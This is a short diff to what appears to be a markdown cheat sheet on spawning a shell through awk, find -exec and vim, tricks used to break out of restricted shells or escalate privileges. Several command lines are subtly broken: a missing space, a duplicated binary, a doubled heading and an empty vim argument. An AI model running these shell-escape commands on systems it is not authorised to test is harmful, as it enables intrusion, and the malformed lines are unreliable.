@@ -46,4 +46,20 @@ awk 'BEGIN {system("/bin/sh")}'
 ```bash
 find /-name nameoffile -exec /bin/awk /bin/awk 'BEGIN {system("/bin/sh")}' \
 ```
--
+- It finds the file after `-name` and then it executes the `awk` command
+
+---
+
+## Using Exec to Launch Shell
+```bash
+find . -exec /bin/sh \; -quit
+```
+
+---
+
+## Vim 
+
+## Vim 
+```bash
+vim -c ''
+```
